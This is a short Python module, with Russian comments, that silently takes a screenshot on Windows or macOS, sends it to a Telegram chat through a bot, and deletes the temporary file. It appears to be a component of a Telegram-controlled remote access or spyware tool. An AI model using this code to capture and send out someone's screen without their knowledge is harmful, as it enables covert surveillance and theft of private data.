import os
from PIL import ImageGrab
import io
import platform
def screen(bot,chat_id):
    if platform.system() == 'Windows':
        # Снимаем скриншот текущего экрана
        screenshot = ImageGrab.grab()
        # Создаем объект байтового потока для сохранения изображения
        buffer = io.BytesIO()
        # Сохраняем скриншот в байтовый поток в формате PNG
        screenshot.save(buffer, format='PNG')
        # Отправляем скриншот в бот
        bot.send_photo(chat_id=chat_id, photo=buffer.getvalue())
    elif platform.system() == 'Darwin':
        os.system("screencapture screen.png -x")
        with open("screen.png", "rb") as file:
            img_data = file.read()
            # Отправка фотографии в Telegram
            bot.send_photo(chat_id=chat_id, photo=img_data, timeout=120)
            # Удаление временного файла скриншота
            os.remove("screen.png")